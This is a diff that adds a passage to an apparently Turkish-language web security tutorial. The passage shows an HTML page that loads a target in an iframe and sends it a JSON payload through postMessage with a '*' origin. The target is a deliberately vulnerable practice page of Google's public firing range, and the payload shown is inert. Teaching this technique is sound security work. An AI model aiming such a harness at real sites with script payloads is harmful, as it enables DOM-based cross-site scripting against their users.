@@ -123,3 +123,19 @@ Aşağıdaki kaynak kodlara sahip hacker.com web sitesinde, iframe ile bu sayfa 
   </body>
 </html>
 ```
+
+Iframe'i daha dinamik kullanabiliriz. Burada iframe ile istediğimiz sayfayı açtırıp iframe yüklemesi bittikten sonra bu frame içerisine bir postMessage gönderiyoruz. Bu postMessage bir payload barındırmakta. Bu payload'ı JSON olarak gönderiyoruz çünkü hedef sitede JSON parse edilecek. Eğer başka türde veri yollarsak hata alırız. "src" kısmına da adresi koyuyoruz. 
+
+```
+<html>
+    <iframe id = "target" src = ""> </iframe>
+  <script>
+    var target = document.getElementById('target');
+    target.addEventListener('load',function(){
+      var payload = {'html':'x'};
+      target.contentWindow.postMessage(JSON.stringify(payload),'*');
+});
+      target.src = "https://public-firing-range.appspot.com/dom/toxicdom/postMessage/innerHtml"
+  </script>
+</html>
+```
